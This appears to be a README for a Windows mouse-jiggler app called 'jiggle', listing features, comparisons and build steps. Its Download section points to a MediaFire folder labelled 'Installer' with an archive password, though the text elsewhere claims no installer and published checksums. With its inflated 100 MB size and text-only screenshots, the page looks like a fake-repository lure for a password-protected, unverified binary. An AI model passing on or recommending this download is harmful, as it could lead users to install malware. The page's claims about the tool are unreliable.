# jiggle

🖱️ Free, open-source mouse jiggler for Windows — keep your PC awake during long reads, renders and transfers. 100 MB portable, no account, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Invisible mode** — micro-moves the cursor one pixel and returns it, so nothing visibly jumps
- ✅ **Interval control** — from every 5 seconds to once an hour, with a randomized human-like pattern option
- ✅ **Trigger modes** — always on, only when idle, or only while a chosen app is in the foreground
- ✅ **Multi-monitor safe** — the cursor returns to its exact stored position on whichever display it sat
- ✅ **Battery-aware stop** — pauses automatically on battery power below a chosen threshold
- ✅ **Hotkey and tray toggle** — Ctrl+Alt+J on and off, with tray state that is impossible to misread
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with CI SHA-256 releases

## Why jiggle

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **jiggle** | Move Mouse | Mouse Jiggler | Caffeine |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Free, OSS | Free |
| Open source | **Yes** | No | Yes | Yes |
| Invisible nudge mode | **Yes** | Partial | Yes | No movement |
| Per-app triggers | **Yes** | Rules | No | No |
| Battery-aware auto-stop | **Yes** | No | No | No |
| Portable, no install | **Yes, 100 MB** | Installer | Requires runtime | Zip |

## FAQ

**how to keep Windows from going to sleep without changing power settings?**

Changing power plans also kills screen blanking and can break group policy on managed machines. jiggle nudges the cursor instead, which resets the idle timer while leaving every power setting untouched. It is a 100 MB portable exe under MIT, works offline, and stops itself on battery power.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark panel (#121417, violet #A78BFA): big ON toggle, mode selector Invisible or Visible, interval slider at 30 s, idle timer showing 4 m 12 s.
2. Triggers view: schedule windows, battery rule, foreground-app picker listing Teams and Acrobat, randomize pattern toggle on.
3. Tray and hotkeys: Ctrl+Alt+J recorder, tray icon legend, activity log with Jiggled at 15:04:33 entries in muted gray.

## Download

| Source | Link |
|---|---|
| 💾 **Installer jiggle** | [Installer jiggle](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).